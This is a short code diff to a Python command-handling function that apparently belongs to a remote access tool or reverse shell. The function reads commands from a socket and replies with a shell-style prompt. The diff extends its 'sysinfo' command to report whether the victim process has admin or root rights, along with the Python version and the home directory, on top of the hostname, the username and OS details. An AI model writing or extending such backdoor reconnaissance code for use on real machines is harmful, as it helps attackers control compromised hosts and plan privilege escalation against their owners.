@@ -209,14 +209,23 @@ def execute_commands(s):
                     continue
                 
                 if cmd == "sysinfo":
+                    try:
+                        import ctypes
+                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() if platform.system() == "Windows" else os.geteuid() == 0
+                    except:
+                        is_admin = False
+                    
                     info = f"""
 === System Information ===
 OS: {platform.system()} {platform.release()}
 Version: {platform.version()}
 Hostname: {platform.node()}
 Username: {getpass.getuser()}
+Admin: {'Yes' if is_admin else 'No'}
 Architecture: {platform.machine()}
 Processor: {platform.processor()}
+Python: {platform.python_version()}
+Home: {os.path.expanduser('~')}
 """
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
